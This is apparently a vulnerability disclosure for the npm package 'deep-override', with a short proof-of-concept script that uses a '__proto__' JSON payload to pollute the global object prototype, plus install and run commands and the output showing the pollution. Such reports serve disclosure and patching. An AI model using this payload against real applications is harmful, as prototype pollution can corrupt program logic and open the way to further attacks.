# Description

`deep-override` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var deepOverride = require("deep-override")
const payload = JSON.parse('{"__proto__":{"polluted":"Yes! Its Polluted"}}');
var obj = {}
console.log("Before : " + {}.polluted);
deepOverride(obj, payload);
console.log("After : " + {}.polluted);
```


2. Execute the following commands in terminal:

```
npm i deep-override # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
